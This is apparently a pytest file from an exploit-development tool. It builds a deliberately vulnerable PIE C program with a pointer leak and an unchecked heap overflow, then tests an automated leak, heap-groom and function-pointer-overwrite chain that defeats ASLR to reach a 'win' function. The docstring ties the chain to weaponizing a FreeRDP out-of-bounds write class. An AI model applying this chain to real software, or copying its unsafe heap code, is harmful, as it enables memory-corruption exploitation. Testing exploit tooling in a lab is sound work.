"""Leak -> groom -> control: the ASLR-defeating heap chain driven to a demonstrated L3 (doc-60
frontier). A PIE target discloses a code pointer, lykos recovers the load base from it, grooms two
adjacent heap chunks and overflows the first into the second's function pointer -- overwriting it
with the RUNTIME address of win -- then triggers the call. Control reaching win is proven by an INT3
oracle at the relocated address, with a negative control (the short overflow) required to miss.

This is the composition the weaponize planner names as the missing step for the FreeRDP OOB-write
class ("needs an information leak to defeat ASLR"): here the whole leak+groom+write chain detonates.
"""
from __future__ import annotations

import struct
import subprocess

import pytest
from lykos.analyze.poc import heap_groom

# A PIE heap target: discloses &main (a code pointer -> PIE base), then drives alloc/alloc/overflow/
# call over a tiny binary protocol. 'A'<u32 size> alloc the overflow buffer (slot0); 'O' alloc the
# victim object (slot1, a function pointer defaulting to noop); 'E'<u32 len><bytes> overflow slot0;
# 'T' call slot1's pointer. No stack protector / PIE so the only control path is the groomed heap.
_SRC = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void win(void){ write(1,"WIN\n",4); _exit(42); }
static void noop(void){ }
typedef struct { void (*fp)(void); char pad[8]; } obj_t;
static unsigned char *slot0; static obj_t *slot1;
int main(void){
  setvbuf(stdout,0,2,0);
  printf("leak %p\n", (void*)&main);        /* disclose a code pointer -> recover PIE base */
  for(;;){
    int c = getchar();
    if (c==EOF || c=='Q') break;
    if (c=='A'){ unsigned int sz=0; if(fread(&sz,4,1,stdin)!=1) break; slot0=malloc(sz); }
    else if (c=='O'){ slot1=malloc(sizeof(obj_t)); slot1->fp=noop; }
    else if (c=='E'){ unsigned int n=0; if(fread(&n,4,1,stdin)!=1) break; if(fread(slot0,1,n,stdin)!=n) break; }
    else if (c=='T'){ slot1->fp(); }
  }
  return 0;
}
"""


def _win_off(exe: str) -> int:
    """win's image vaddr == its offset from the PIE base."""
    out = subprocess.run(["nm", exe], capture_output=True, text=True).stdout
    for ln in out.splitlines():
        parts = ln.split()
        if len(parts) == 3 and parts[2] == "win":
            return int(parts[0], 16)
    raise AssertionError("win symbol not found")


@pytest.fixture(scope="module")
def pie_heap(tmp_path_factory, gcc):
    d = tmp_path_factory.mktemp("leakgroom")
    src = d / "h.c"; src.write_text(_SRC)
    exe = d / "h"
    r = subprocess.run([gcc, "-fPIE", "-pie", "-fno-stack-protector", "-O0", "-w",
                        str(src), "-o", str(exe)], capture_output=True)
    if r.returncode:
        pytest.skip(f"fixture did not build: {r.stderr.decode()[:200]}")
    return exe


def _spec() -> heap_groom.MenuSpec:
    return heap_groom.MenuSpec(
        alloc_buf=lambda sz: b"A" + struct.pack("<I", sz),
        alloc_obj=lambda: b"O",
        edit_buf=lambda data: b"E" + struct.pack("<I", len(data)) + data,
        trigger=lambda: b"T",
    )


def test_leak_groom_control_reaches_win_under_aslr(pie_heap):
    """The chain detonates: base recovered from the leak, groom overwrites the adjacent fptr with the
    runtime win, control transfers there. Negative control (short overflow) must miss -> sound L3."""
    tb = pie_heap.read_bytes()
    win_off = _win_off(str(pie_heap))
    # buf_request 24 -> chunk 32; the 16-byte victim also lands in a 32 chunk, so the fptr sits
    # exactly 32 bytes after the buffer's user data (proven inside plan_adjacent_overflow).
    plan = heap_groom.plan_adjacent_overflow(24, 0, obj_fptr_off=0)
    assert heap_groom.detonate_leak_groom(str(pie_heap), plan, _spec(),
                                          win_off=win_off, target_bytes=tb, timeout=15.0)


def test_groom_without_the_overwrite_does_not_reach_win(pie_heap):
    """Guard the oracle: driving only the negative (short) overflow never reaches win -- so the
    positive result above is our overwrite, not the target doing it on its own."""
    tb = pie_heap.read_bytes()
    win_off = _win_off(str(pie_heap))
    plan = heap_groom.plan_adjacent_overflow(24, 0, obj_fptr_off=0)
    from lykos.analyze.poc import detonate
    reached, _ = detonate.reaches_runtime_address(
        str(pie_heap), win_off=win_off, target_bytes=tb,
        make_payload=lambda _b, _w: heap_groom._groom_stream(plan, _spec(), _w, negative=True),
        timeout=15.0)
    assert not reached
